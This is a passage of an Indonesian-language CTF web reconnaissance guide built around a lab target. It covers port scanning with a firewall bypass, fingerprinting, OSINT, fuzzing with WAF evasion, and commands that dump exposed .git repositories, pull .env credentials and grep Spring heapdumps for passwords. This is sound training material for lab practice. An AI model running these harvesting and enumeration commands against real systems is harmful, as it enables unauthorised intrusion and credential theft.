Parameter yang dikirim mengandung karakter khusus (&, space, ?) terpotong atau menghasilkan 400 Bad Request.
```

**Penyebab:** Karakter khusus di-interpretasikan secara salah oleh parser URL.
**Solusi & Command Fix:**
Gunakan URL encoding (`%20` untuk spasi, `%26` untuk `&`, `%23` untuk `#`):
```bash
# Gunakan curl --data-urlencode:
curl -s -G "http://TARGET/search.php" --data-urlencode "query=admin & test"

# Di Burp Suite: blok teks lalu tekan Ctrl + U untuk auto-encode
```

---

## 📋 BAGIAN 12: CHEATSHEET (COPY-PASTE READY)

Simpan variabel target di terminal Parrot OS Anda terlebih dahulu:
```bash
export TARGET="http://10.10.11.200"
export DOMAIN="target.htb"
```

### 1. Technology Detection
```bash
# Quick WhatWeb
whatweb -a 3 -v $TARGET

# Quick Raw Headers
curl -s -I -L -k $TARGET

# Quick Nikto Scan (Jalankan di background)
nikto -h $TARGET -output nikto.txt &
```

### 2. Robots.txt & Sensitive Files Check
```bash
# Download & Parse Robots.txt
curl -s $TARGET/robots.txt | grep -i "Disallow:" | awk '{print $2}'

# Download & Parse Sitemap.xml
curl -s $TARGET/sitemap.xml | xmllint --format - | grep -oP '(?<=<loc>)[^<]+'

# Check Git Exposure
curl -s -I $TARGET/.git/HEAD
```

### 3. ffuf Directory Fuzzing Commands
```bash
# Fast Directory Check (common.txt - < 5 detik)
ffuf -u "$TARGET/FUZZ" -w /usr/share/dirb/wordlists/common.txt -c -t 50

# Standard CTF Directory Fuzzing (directory-list-2.3-medium)
ffuf -u "$TARGET/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -v -ic -t 40

# File Fuzzing dengan Ekstensi PHP & Backups
ffuf -u "$TARGET/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.html,.bak,.old,.zip -c -t 40

# Fuzzing dengan Filter Ukuran Baseline (Misal Soft 404 berukuran 1450 bytes)
ffuf -u "$TARGET/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 1450 -c -t 40
```

### 4. Virtual Host & Subdomain Fuzzing
```bash
# Fuzzing Host Header (Cari ukuran baseline dulu via curl)
ffuf -u "$TARGET" -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs [SIZE] -c

# Gobuster VHost Mode
gobuster vhost -u "$TARGET" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 30
```

### 5. Parameter Discovery
```bash
# Arjun GET Parameter Fuzzing
arjun -u "$TARGET/index.php" -m GET

# Arjun POST JSON Parameter Fuzzing
arjun -u "$TARGET/api/login" -m JSON

# ffuf Parameter Mining
ffuf -u "$TARGET/index.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs [SIZE] -c
```

### 6. Git Dumping & Secret Grepping
```bash
# Dump Git Repo
git-dumper $TARGET/.git/ ./dumped_git/

# Grep Secrets di folder lokal
grep -rnEi "api[_-]?key|password|secret|token|auth" ./dumped_git/
```

---

# [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) — Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export TARGET_URL="http://10.10.11.200"
export DOMAIN="target.htb"
export LHOST="10.10.14.5"
export LPORT="4444"
mkdir -p ~/web_recon/{ffuf,vhost,js,git,params,loot,screenshots}
cd ~/web_recon

echo "[*] Target: $TARGET | URL: $TARGET_URL | Domain: $DOMAIN"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | URL: http://10.10.11.200 | Domain: target.htb
```

---

## ══════════════════════════════════════

## FASE 0: KONFIRMASI PORT WEB AKTIF

## ══════════════════════════════════════

### Langkah 0.1 — Deteksi Port Web yang Terbuka

Bash

```
# Command 1: Scan cepat port web yang umum
nmap -p 80,443,8080,8000,8443,5000,3000,8888 -sV --open $TARGET

# Command 2: Jika target tidak merespons ping (firewall ICMP)
nmap -Pn -p 80,443,8080,8000,8443,5000 -sV --open $TARGET

# Command 3: Scan lebih luas untuk menemukan port tak standar
nmap -p- --min-rate 5000 --open $TARGET | grep -E "open|http"
```

**OUTPUT BERHASIL ✅ — Port web ditemukan:**

text

```
80/tcp   open  http    Apache httpd 2.4.52 (Ubuntu)
443/tcp  open  https   Apache httpd 2.4.52 (Ubuntu)
8080/tcp open  http    Jetty 9.4.43
```

➡️ Catat semua port yang open. Set variabel:

Bash

```
# Jika hanya port 80
export TARGET_URL="http://$TARGET"

# Jika ada HTTPS (self-signed)
export TARGET_URL="https://$TARGET"

# Jika port custom
export TARGET_URL="http://$TARGET:8080"
```

**OUTPUT BERHASIL ✅ — Redirect dari HTTP ke HTTPS:**

text

```
80/tcp  open  http   (redirect to https)
443/tcp open  https  nginx 1.18.0
```

➡️ Set URL ke HTTPS:

Bash

```
export TARGET_URL="https://$TARGET"
# Semua command selanjutnya pakai flag -k untuk skip SSL verification
```

**OUTPUT GAGAL ❌ — Semua port filtered:**

text

```
All 65535 scanned ports are in ignored states.
```

➡️ Coba dengan source port bypass:

Bash

```
nmap -Pn -p 80,443 --source-port 53 $TARGET
nmap -Pn -sA -p 80,443 $TARGET    # ACK scan untuk detect firewall rules
```

---

### Langkah 0.2 — Konfirmasi Web Server Merespons

Bash

```
# Command 1: Basic check dengan curl
curl -s -I -L -k $TARGET_URL

# Command 2: Lihat raw response dengan verbose
curl -v -k $TARGET_URL 2>&1 | head -40

# Command 3: Follow redirect dan lihat halaman akhir
curl -s -L -k $TARGET_URL -o /dev/null -w "Final URL: %{url_effective}\nHTTP Code: %{http_code}\nSize: %{size_download}\n"
```

**OUTPUT BERHASIL ✅ — Server merespons normal:**

text

```
HTTP/1.1 200 OK
Date: Mon, 20 Jan 2025 10:00:00 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: PHP/7.4.3
Content-Type: text/html; charset=UTF-8
Content-Length: 4521
```

➡️ **CATAT SEMUA HEADER INI!** Pergi ke Fase 1 (Technology Detection).

**OUTPUT BERHASIL ✅ — Redirect ke domain (Virtual Host!):**

text

```
HTTP/1.1 302 Found
Location: http://target.htb/
```

➡️ **Server butuh hostname!** Tambahkan ke `/etc/hosts`:

Bash

```
echo "$TARGET $DOMAIN" | sudo tee -a /etc/hosts
export TARGET_URL="http://$DOMAIN"
curl -s -I $TARGET_URL    # Cek ulang dengan domain
```

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
curl: (7) Failed to connect to 10.10.11.200 port 80: Connection refused
```

➡️ Port 80 tidak aktif. Coba port lain:

Bash

```
for port in 443 8080 8000 8443 3000 5000 8888; do
    result=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://$TARGET:$port" 2>/dev/null)
    [ "$result" != "000" ] && echo "[+] Port $port: HTTP $result"
done
```

---

## ══════════════════════════════════════

## FASE 1: TECHNOLOGY DETECTION

## ══════════════════════════════════════

> **WAJIB dilakukan sebelum fuzzing!** Mengetahui teknologi = menentukan ekstensi yang tepat untuk di-fuzz.

### Langkah 1.1 — WhatWeb Fingerprinting

Bash

```
# Command 1: Aggression Level 1 (Pasif, tidak mengirim payload berbahaya)
whatweb $TARGET_URL | tee ~/web_recon/whatweb_basic.txt

# Command 2: Aggression Level 3 (Agresif, lebih banyak info)
whatweb -a 3 -v $TARGET_URL | tee ~/web_recon/whatweb_verbose.txt

# Command 3: Export ke JSON untuk parsing
whatweb -a 3 $TARGET_URL --log-json=~/web_recon/whatweb.json 2>/dev/null
```

**OUTPUT BERHASIL ✅ — WordPress terdeteksi:**

text

```
http://10.10.11.200 [200 OK] Apache[2.4.52], Cookies[PHPSESSID],
HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)],
JQuery[3.6.0], MetaGenerator[WordPress 5.8.2], PHP[7.4.3],
Script[text/javascript], Title[Secure Corporate Portal - Login],
WordPress[5.8.2], X-Powered-By[PHP/7.4.3]
```

➡️ **WordPress terdeteksi!** Catat dan lakukan:

Bash

```
export CMS="wordpress"
export PHP_VERSION="7.4.3"
# → Lanjut ke <a href="/docs/wordpress" class="text-[#00b4d8] hover:underline font-mono font-semibold">17a_wordpress_workflow.md</a> untuk full WordPress exploitation
# → Tapi tetap lanjutkan Fase ini dulu untuk recon lengkap
```

**OUTPUT BERHASIL ✅ — Python Flask terdeteksi:**

text

```
http://10.10.11.200 [200 OK] Cookies[session], HTTPServer[Werkzeug/2.0.2 Python/3.9.7],
Python[3.9.7], Title[Dashboard], Werkzeug[2.0.2]
```

➡️ **Flask terdeteksi!** Implikasi:

Bash

```
export FRAMEWORK="flask"
# Flask = SSTI rentan (Jinja2 templating)
# Cookie "session" = Flask signed cookie (bisa di-decode/forge)
# → Prioritas: Cek SSTI di input fields! → ke <a href="/docs/ssti" class="text-[#00b4d8] hover:underline font-mono font-semibold">23_ssti_workflow.md</a>
# → Decode Flask session cookie untuk cari secret key atau data sensitif
python3 -c "import base64,json; cookie='eyJhZG1pbiI6ZmFsc2V9'; print(json.loads(base64.b64decode(cookie+'==')))"
```

**OUTPUT BERHASIL ✅ — Node.js/Express terdeteksi:**

text

```
http://10.10.11.200 [200 OK] Bootstrap[5.1.3], Express[],
HTTPServer[Express], Node.js, X-Powered-By[Express]
```

➡️ **Node.js/Express!** Implikasi:

Bash

```
export FRAMEWORK="nodejs"
# Express = Fuzzing TANPA ekstensi (route: /api/login, bukan /login.php)
# Kemungkinan MongoDB backend → NoSQL Injection
# Kemungkinan EJS/Pug templating → SSTI
# → Fokus fuzzing direktori/route tanpa ekstensi
```

**OUTPUT BERHASIL ✅ — Java Spring Boot terdeteksi:**

text

```
http://10.10.11.200 [200 OK] HTTPServer[Jetty(9.4.43.v20210629)],
Spring-Boot, Title[Whitelabel Error Page], X-Application-Context[application]
```

➡️ **Spring Boot!** Prioritas:

Bash

```
export FRAMEWORK="springboot"
# → LANGSUNG cek Spring Actuators!
curl -s http://$TARGET:8080/actuator/env | python3 -m json.tool
curl -s http://$TARGET:8080/actuator/health
curl -I http://$TARGET:8080/actuator/heapdump    # Memory dump = passwords!

# Fuzzing ekstensi: .do, .action, .jsp, .jspx
```

**OUTPUT GAGAL ❌ — WhatWeb tidak terdeteksi apapun:**

text

```
http://10.10.11.200 [200 OK] Title[Unknown]
```

➡️ Coba manual header analysis:

Bash

```
# Lanjut ke Langkah 1.2 untuk analisis manual
curl -s -I -k $TARGET_URL
```

---

### Langkah 1.2 — Manual Header Analysis via cURL

Bash

```
# Command 1: Header lengkap
curl -s -I -L -k $TARGET_URL | tee ~/web_recon/headers.txt

# Command 2: Verbose untuk melihat semua termasuk TLS info
curl -v -k $TARGET_URL 2>&1 | grep -E "^[<>]|Server:|X-Powered|Content-Type|Set-Cookie|Location" | tee ~/web_recon/headers_verbose.txt

# Command 3: Lihat source halaman utama (cari clue di HTML)
curl -s -k $TARGET_URL | head -50
```

**OUTPUT BERHASIL ✅ — Headers memberi clue teknologi:**

text

```
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: PHP/7.4.3          ← PHP confirmed
Set-Cookie: PHPSESSID=abc123      ← PHP session
Set-Cookie: session=eyJ...        ← Mungkin Flask JWT!
X-Frame-Options: SAMEORIGIN
Content-Type: text/html; charset=UTF-8
```

**Panduan interpretasi header:**

|Header|Nilai|Teknologi|Tindakan|
|---|---|---|---|
|`Server: Werkzeug`|Python|Flask|Cek SSTI, decode cookie|
|`X-Powered-By: PHP/7.4`|PHP|PHP|Fuzz `.php,.bak,.phps`|
|`X-Powered-By: Express`|Node.js|Express|Fuzz route tanpa ekstensi|
|`Set-Cookie: JSESSIONID`|Java|Tomcat/Spring|Cek `/manager/html`, Actuators|
|`Set-Cookie: PHPSESSID`|PHP|PHP native|LFI via session file|
|`Set-Cookie: csrftoken`|Python|Django|Cek debug mode|
|`Server: nginx`|Any|nginx reverse proxy|Mungkin ada app di belakang|

Bash

```
# Simpan teknologi yang terdeteksi
echo "Technology Stack:" | tee ~/web_recon/tech_stack.txt
grep -i "Server\|X-Powered-By\|Set-Cookie\|Content-Type" ~/web_recon/headers.txt | tee -a ~/web_recon/tech_stack.txt
```

---

### Langkah 1.3 — Tentukan Ekstensi untuk Fuzzing (BERDASARKAN TEKNOLOGI)

Bash

```
# Berdasarkan hasil Langkah 1.1 dan 1.2, set ekstensi:

# Jika PHP:
export EXTENSIONS=".php,.php5,.phtml,.phps,.inc,.txt,.html,.bak,.old,.zip,.sql"

# Jika Python Flask/Django:
export EXTENSIONS=".py,.html,.txt,.cfg,.ini,.env"

# Jika Node.js:
export EXTENSIONS=".js,.json,.env,.yml,.txt"
# JUGA: Fuzz tanpa ekstensi untuk routes!

# Jika Java Spring/Tomcat:
export EXTENSIONS=".jsp,.jspx,.do,.action,.war,.java,.class,.txt"

# Jika ASP.NET:
export EXTENSIONS=".aspx,.ashx,.asmx,.axd,.config,.cs,.txt,.bak"

# Universal (gunakan jika tidak tahu teknologi):
export EXTENSIONS=".php,.txt,.html,.bak,.old,.zip,.sql,.json,.env,.config,.xml,.yml"

echo "[*] Ekstensi untuk fuzzing: $EXTENSIONS"
```

---

## ══════════════════════════════════════

## FASE 2: PASSIVE RECON (OSINT)

## ══════════════════════════════════════

> **Lakukan sebelum fuzzing aktif!** Gratis dan tidak memicu IDS/WAF.

### Langkah 2.1 — Robots.txt & Sitemap.xml (WAJIB!)

Bash

```
# Command 1: Download dan baca robots.txt
curl -s -k $TARGET_URL/robots.txt | tee ~/web_recon/robots.txt

# Command 2: Filter dan test semua path yang dilarang
echo "=== Testing Disallow paths ==="
while IFS= read -r line; do
    path=$(echo "$line" | grep -i "Disallow:" | awk '{print $2}' | tr -d '\r')
    if [ -n "$path" ]; then
        status=$(curl -s -o /dev/null -w "%{http_code}" -k "$TARGET_URL$path" 2>/dev/null)
        echo "[$status] $path"
    fi
done < ~/web_recon/robots.txt

# Command 3: Sitemap.xml
curl -s -k $TARGET_URL/sitemap.xml | tee ~/web_recon/sitemap.xml

# Parse URL dari sitemap
curl -s -k $TARGET_URL/sitemap.xml | grep -oP '(?<=<loc>)[^<]+' | tee ~/web_recon/sitemap_urls.txt
```

**OUTPUT BERHASIL ✅ — Robots.txt dengan path sensitif:**

text

```
User-agent: *
Disallow: /admin/
Disallow: /dev_backup/
Disallow: /api/v2/private/
Disallow: /uploads/raw/
Disallow: /secret_key.txt
Disallow: /changelog.html
```

➡️ **JACKPOT!** Setiap path ini adalah target eksplisit:

Bash

```
# Test semua path secara otomatis
for path in /admin/ /dev_backup/ /api/v2/private/ /uploads/raw/ /secret_key.txt /changelog.html; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -k "$TARGET_URL$path")
    size=$(curl -s -k "$TARGET_URL$path" | wc -c)
    echo "[$status] $path (${size} bytes)"
done

# Download file sensitif yang accessible
curl -s -k "$TARGET_URL/secret_key.txt" -o ~/web_recon/loot/secret_key.txt
curl -s -k "$TARGET_URL/changelog.html" | grep -iE "version|CVE|fix|bug" | head -20
```

**Panduan tindakan per path:**

|Path di robots.txt|Tindakan|
|---|---|
|`/admin/`|Uji default creds, SQLi bypass, brute force|
|`/backup/`, `/dev_backup/`|Fuzzing file arsip: `.zip,.sql,.tar.gz`|
|`/uploads/`, `/upload/`|Cek directory listing, upload bypass|
|`/api/`, `/swagger/`|Baca dokumentasi API, cari endpoint sensitif|
|`/secret_key.txt`|Download langsung!|
|`/changelog.html`|Cari versi, cek CVE untuk versi tersebut|

**OUTPUT GAGAL ❌ — Robots.txt 404:**

text

```
<!DOCTYPE HTML><title>404 Not Found</title>
```

➡️ Tidak ada robots.txt. Lanjut ke Langkah 2.2.

---

### Langkah 2.2 — Certificate Transparency & OSINT (Jika Domain Diketahui)

Bash

```
# Command 1: crt.sh - Cari subdomain dari SSL certificates (tanpa menyentuh target!)
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | python3 -c "
import json, sys
data = json.load(sys.stdin)
domains = set()
for entry in data:
    name = entry.get('name_value', '')
    for d in name.split('\n'):
        d = d.strip().lstrip('*.')
        if d and not d.startswith('@'):
            domains.add(d)
for d in sorted(domains):
    print(d)
" | tee ~/web_recon/crtsh_domains.txt

# Command 2: Wayback Machine - URL yang pernah ada
curl -s "http://web.archive.org/cdx/search/cdx?url=$DOMAIN/*&output=json&fl=original&collapse=urlkey&limit=100" \
    | python3 -c "import json,sys; [print(x[0]) for x in json.load(sys.stdin)[1:]]" \
    | tee ~/web_recon/wayback_urls.txt

# Command 3: Google Dorks (Manual - copy paste ke browser)
echo "=== Google Dorks untuk $DOMAIN ==="
echo "site:$DOMAIN filetype:pdf OR filetype:xlsx OR filetype:docx"
echo "site:$DOMAIN inurl:admin OR inurl:login OR inurl:portal"
echo "site:$DOMAIN intitle:\"index of /\""
echo "site:$DOMAIN inurl:\".php?id=\""
echo "site:$DOMAIN ext:env OR ext:yml OR ext:log"
```

**OUTPUT BERHASIL ✅ — Subdomain dari crt.sh:**

text

```
admin.target.htb
dev.target.htb
api.target.htb
staging.target.htb
mail.target.htb
```

➡️ Tambahkan ke `/etc/hosts` dan recon masing-masing:

Bash

```
echo "$TARGET admin.target.htb dev.target.htb api.target.htb staging.target.htb" | sudo tee -a /etc/hosts

# Cek mana yang aktif
for sub in admin.target.htb dev.target.htb api.target.htb staging.target.htb; do
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://$sub" 2>/dev/null)
    echo "[$status] http://$sub"
done
```

**OUTPUT BERHASIL ✅ — URL lama dari Wayback Machine:**

text

```
http://target.htb/admin/config.php
http://target.htb/backup/database.sql
http://target.htb/dev/test.php
```

➡️ Coba akses URL lama ini meskipun mungkin sudah dihapus:

Bash

```
while read url; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -k "$url" 2>/dev/null)
    [ "$status" != "404" ] && echo "[$status] $url"
done < ~/web_recon/wayback_urls.txt
```

---

## ══════════════════════════════════════

## FASE 3: SENSITIVE FILE QUICK CHECK

## ══════════════════════════════════════

> **Lakukan SEBELUM fuzzing panjang!** Sering langsung dapat flag dalam 2 menit.

### Langkah 3.1 — High-Value Sensitive Files Check

Bash

```
# Jalankan semua pengecekan sekaligus
echo "=== Sensitive Files Quick Probe ==="
SENSITIVE_PATHS=(
    "/.git/HEAD"
    "/.env"
    "/.env.local"
    "/.env.production"
    "/phpinfo.php"
    "/info.php"
    "/server-status"
    "/server-info"
    "/config.php.bak"
    "/config.php~"
    "/wp-config.php.bak"
    "/web.config"
    "/.htaccess"
    "/backup.zip"
    "/backup.tar.gz"
    "/db.sql"
    "/dump.sql"
    "/database.sql"
    "/admin"
    "/api"
    "/swagger.json"
    "/swagger-ui.html"
    "/api-docs"
    "/actuator/env"
    "/actuator/heapdump"
    "/.DS_Store"
    "/.svn/entries"
    "/crossdomain.xml"
    "/.well-known/security.txt"
    "/package.json"
    "/composer.json"
)

for path in "${SENSITIVE_PATHS[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -k "$TARGET_URL$path" 2>/dev/null)
    size=$(curl -s -k "$TARGET_URL$path" 2>/dev/null | wc -c)
    if [[ "$status" == "200" || "$status" == "301" || "$status" == "403" ]]; then
        echo "[HIT][$status][${size}b] $path"
        echo "$TARGET_URL$path (HTTP $status, ${size}b)" >> ~/web_recon/sensitive_hits.txt
    fi
done
```

**OUTPUT BERHASIL ✅ — .git/HEAD terbuka:**

text

```
[HIT][200][23b] /.git/HEAD
```

➡️ **Git repository exposed!** Dump seluruh repo:

Bash

```
# Install git-dumper
sudo apt install git-dumper -y || pip3 install git-dumper

# Dump repository
git-dumper "$TARGET_URL/.git/" ~/web_recon/git/dumped_repo/

# Analisis commit history
cd ~/web_recon/git/dumped_repo/
git log --oneline | head -20
git log -p | grep -Ei "password|secret|key|token|api|credential" | head -50

# Cari file yang pernah dihapus
git stash list
git log --all --diff-filter=D --name-only --pretty=format:""
```

**OUTPUT BERHASIL ✅ — .env terbuka:**

text

```
[HIT][200][342b] /.env
```

➡️ **Credentials langsung tersedia!**

Bash

```
curl -s -k "$TARGET_URL/.env" | tee ~/web_recon/loot/env_file.txt

# Parse credentials
grep -iE "password|pass|secret|key|token|db_|database|api" ~/web_recon/loot/env_file.txt
```

**Output .env yang dicari:**

text

```
APP_KEY=base64:SomeRandomKey123
DB_HOST=localhost
DB_DATABASE=webapp
DB_USERNAME=webapp_user
DB_PASSWORD=SuperSecret2024!
REDIS_PASSWORD=redis_pass_123
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

➡️ Simpan semua credentials:

Bash

```
echo "DB: webapp_user:SuperSecret2024!" >> ~/web_recon/loot/found_creds.txt
# Test credentials ini ke semua service lain yang ditemukan nmap!
```

**OUTPUT BERHASIL ✅ — phpinfo.php terbuka:**

text

```
[HIT][200][89432b] /phpinfo.php
```

➡️ Dapat informasi berharga:

Bash

```
curl -s -k "$TARGET_URL/phpinfo.php" | grep -iE "php_version|disable_functions|open_basedir|upload_tmp_dir|session.save_path|SERVER_ROOT|DOCUMENT_ROOT" | head -30
```

**OUTPUT BERHASIL ✅ — Spring Actuator heapdump:**

text

```
[HIT][200][15234567b] /actuator/heapdump
```

➡️ Memory dump bisa berisi passwords! Download dan analisis:

Bash

```
# Download heapdump (bisa besar - 100MB+)
curl -s -k "$TARGET_URL/actuator/heapdump" -o ~/web_recon/loot/heapdump.hprof

# Grep langsung dari heapdump untuk credentials
strings ~/web_recon/loot/heapdump.hprof | grep -iE "password|secret|token|key" | head -30

# Atau gunakan jhat/Eclipse MAT untuk analisis lebih mendalam
# Google: "spring boot heapdump password extraction"
```

**OUTPUT BERHASIL ✅ — actuator/env terbuka:**

text

```
[HIT][200][4521b] /actuator/env
```

➡️:

Bash

```
curl -s -k "$TARGET_URL/actuator/env" | python3 -m json.tool | grep -iE "password|secret|key|token|credential" | head -20
```

**OUTPUT GAGAL ❌ — Semua 404:**

text

```
(tidak ada HIT sama sekali)
```

➡️ Lanjut ke fuzzing di Fase 4. Tidak ada quick win kali ini.

---

## ══════════════════════════════════════

## FASE 4: DIRECTORY & FILE FUZZING

## ══════════════════════════════════════

> **Ini adalah fase terpanjang.** Jalankan di background sementara lakukan analisis manual.

### Langkah 4.1 — Kalibrasi Baseline (WAJIB Sebelum Fuzzing!)

Bash

```
# STEP 1: Cek apakah ada Soft 404 / Wildcard Response
# Request path yang mustahil ada
RANDOM_PATH=$(cat /dev/urandom | tr -dc 'a-z' | head -c 16)
echo "[*] Testing path yang tidak ada: /$RANDOM_PATH"

curl -s -i -k "$TARGET_URL/$RANDOM_PATH" | head -20

# Ambil ukuran halaman 404
BASELINE_SIZE=$(curl -s -k "$TARGET_URL/$RANDOM_PATH" | wc -c)
BASELINE_WORDS=$(curl -s -k "$TARGET_URL/$RANDOM_PATH" | wc -w)
echo "[*] Baseline size: ${BASELINE_SIZE} bytes, words: ${BASELINE_WORDS}"
```

**OUTPUT BERHASIL ✅ — 404 normal:**

text

```
HTTP/1.1 404 Not Found
Content-Length: 196
```

➡️ Normal! ffuf default filtering akan bekerja. Tidak perlu `-fs`.

**OUTPUT GAGAL ❌ — Soft 404 (200 untuk semua):**

text

```
HTTP/1.1 200 OK
Content-Length: 3412    ← Ini ukuran Soft 404
```

➡️ **WAJIB pakai `-fs 3412` di ffuf!**

Bash

```
export FILTER_SIZE=$BASELINE_SIZE
echo "[!] SOFT 404 DETECTED! Gunakan: -fs $FILTER_SIZE di semua ffuf command"
```

---

### Langkah 4.2 — Quick Directory Check (Fase Pertama — Cepat)

Bash

```
# Command 1: Quick scan dengan common.txt (< 30 detik)
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/dirb/wordlists/common.txt \
    -c -t 50 -ic \
    ${FILTER_SIZE:+-fs $FILTER_SIZE} \
    | tee ~/web_recon/ffuf/quick_scan.txt

# Command 2: Alternatif dengan gobuster (jika ffuf not installed)
gobuster dir -u $TARGET_URL \
    -w /usr/share/dirb/wordlists/common.txt \
    -t 40 -k \
    | tee ~/web_recon/ffuf/gobuster_quick.txt
```

**OUTPUT BERHASIL ✅ — Direktori ditemukan:**

text

```
admin          [Status: 301, Size: 312, Words: 20, Lines: 10]
assets         [Status: 301, Size: 313, Words: 20, Lines: 10]
login          [Status: 200, Size: 2450, Words: 120, Lines: 65]
robots.txt     [Status: 200, Size: 154, Words: 14, Lines: 6]
uploads        [Status: 301, Size: 314, Words: 20, Lines: 10]
backup         [Status: 403, Size: 276, Words: 20, Lines: 10]
```

➡️ **Analisis setiap temuan:**

|Status|Path|Tindakan|
|---|---|---|
|`200`|`/login`|Coba default creds, SQLi, brute force|
|`301`|`/admin`|Follow redirect, test auth bypass|
|`301`|`/uploads`|Cek directory listing, file upload exploit|
|`403`|`/backup`|Bypass 403! Coba method lain|

Bash

```
# Test setiap path yang ditemukan
for path in admin login uploads backup; do
    echo "=== Testing /$path ==="
    curl -s -k "$TARGET_URL/$path/" | head -20
    echo ""
done
```

**OUTPUT GAGAL ❌ — Tidak ada temuan:**

text

```
(ffuf selesai tanpa output)
```

➡️ Kemungkinan Soft 404. Cek:

Bash

```
# Test apakah semua response sama
curl -s -k "$TARGET_URL/admin" | md5sum
curl -s -k "$TARGET_URL/randomxyz123" | md5sum
# Jika MD5 sama → Soft 404, gunakan -fs [SIZE]
```

---

### Langkah 4.3 — Full Directory Fuzzing (Medium Wordlist)

Bash

```
# Command utama: Standard CTF fuzzing
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -c -v -ic -t 40 \
    ${FILTER_SIZE:+-fs $FILTER_SIZE} \
    -o ~/web_recon/ffuf/full_dirs.json -of json \
    | tee ~/web_recon/ffuf/full_dirs.txt

# JIKA HTTPS dengan self-signed cert (WAJIB tambah -k):
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -c -v -ic -t 40 -k \
    ${FILTER_SIZE:+-fs $FILTER_SIZE} \
    | tee ~/web_recon/ffuf/full_dirs_https.txt

# Jika kena WAF (terlalu cepat → 429 atau 503):
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
    -rate 20 -t 5 -p 0.2 -c \
    ${FILTER_SIZE:+-fs $FILTER_SIZE}
```

**OUTPUT BERHASIL ✅ — Lebih banyak direktori:**

text

```
dev            [Status: 200, Size: 1845, Words: 95, Lines: 42]
internal       [Status: 200, Size: 4120, Words: 320, Lines: 85]
api            [Status: 200, Size: 892, Words: 45, Lines: 20]
.git           [Status: 301, Size: 234]
config         [Status: 403, Size: 276]
```

➡️ `/dev` dan `/internal` accessible! Segera investigasi:

Bash

```
# Browse setiap direktori baru
curl -s -k "$TARGET_URL/dev/" | head -30
curl -s -k "$TARGET_URL/internal/" | head -30

# Cek directory listing
curl -s -k "$TARGET_URL/dev/" | grep -i "href\|<a " | head -20
```

---

### Langkah 4.4 — File Fuzzing dengan Ekstensi Spesifik

Bash

```
# Berdasarkan teknologi yang terdeteksi di Fase 1:

# Untuk PHP:
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -e .php,.php5,.phtml,.phps,.inc,.bak,.old,.txt,.zip,.sql,.config \
    -c -t 40 -ic \
    ${FILTER_SIZE:+-fs $FILTER_SIZE} \
    | tee ~/web_recon/ffuf/php_files.txt

# Untuk Python/Node.js (route tanpa ekstensi + config files):
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -e .env,.json,.yml,.yaml,.config,.txt \
    -c -t 40 -ic \
    ${FILTER_SIZE:+-fs $FILTER_SIZE} \
    | tee ~/web_recon/ffuf/nodejs_routes.txt

# Generic backup file hunting (selalu jalankan ini):
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    -c -t 40 -ic \
    ${FILTER_SIZE:+-fs $FILTER_SIZE} \
    | tee ~/web_recon/ffuf/files_scan.txt

# Quick win - file sensitif yang umum (2500 path):
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
    -c -t 40 \
    ${FILTER_SIZE:+-fs $FILTER_SIZE} \
    | tee ~/web_recon/ffuf/quickhits.txt
```

**OUTPUT BERHASIL ✅ — File sensitif ditemukan:**

text

```
config.php.bak    [Status: 200, Size: 892, Words: 45, Lines: 20]
notes.txt         [Status: 200, Size: 156, Words: 23, Lines: 8]
backup.zip        [Status: 200, Size: 45231345, Words: 0, Lines: 0]
db.sql            [Status: 200, Size: 892345, Words: 0, Lines: 0]
```

➡️ **Download semuanya!**

Bash

```
# Download file sensitif
curl -s -k "$TARGET_URL/config.php.bak" -o ~/web_recon/loot/config.php.bak
curl -s -k "$TARGET_URL/notes.txt" -o ~/web_recon/loot/notes.txt
curl -s -k "$TARGET_URL/backup.zip" -o ~/web_recon/loot/backup.zip
curl -s -k "$TARGET_URL/db.sql" -o ~/web_recon/loot/db.sql

# Analisis konten
cat ~/web_recon/loot/config.php.bak
cat ~/web_recon/loot/notes.txt
